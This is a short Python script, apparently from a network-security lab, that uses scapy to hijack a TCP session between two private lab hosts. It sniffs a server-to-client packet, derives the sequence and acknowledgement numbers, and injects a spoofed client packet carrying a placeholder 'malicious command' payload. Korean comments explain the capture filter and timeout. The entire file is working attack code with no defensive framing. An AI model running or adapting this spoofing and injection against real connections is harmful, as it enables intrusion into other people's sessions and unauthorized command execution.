# hijacking.py
from scapy.all import IP, TCP, sniff, send

client_ip = "192.168.110.128"
server_ip = "192.168.110.129"
server_port = 80


def hijack(packet):
    if packet[TCP].flags == "PA":
        seq = packet[TCP].ack
        ack = packet[TCP].seq + len(packet[TCP].payload)

        spoofed_payload = b"malicious command\n"

        spoofed_packet = (
            IP(src=client_ip, dst=server_ip) /
            TCP(sport=packet[TCP].dport, dport=server_port,
                flags="PA", seq=seq, ack=ack) /
            spoofed_payload
        )
        send(spoofed_packet, verbose=False)


if __name__ == "__main__":
    sniff(
        # 방향을 명시: 서버 -> 클라이언트 패킷만 캡처한다.
        # (이 코드의 seq/ack 계산과 sport=packet[TCP].dport 로직이
        #  이 방향을 전제로 하기 때문에 방향을 고정해야 정확하다.)
        filter=f"tcp and src host {server_ip} and dst host {client_ip} and src port {server_port}",
        prn=hijack,
        count=1,
        timeout=30,  # 30초 안에 해당 세션 패킷이 없으면 그냥 종료 (무한 대기 방지)
    )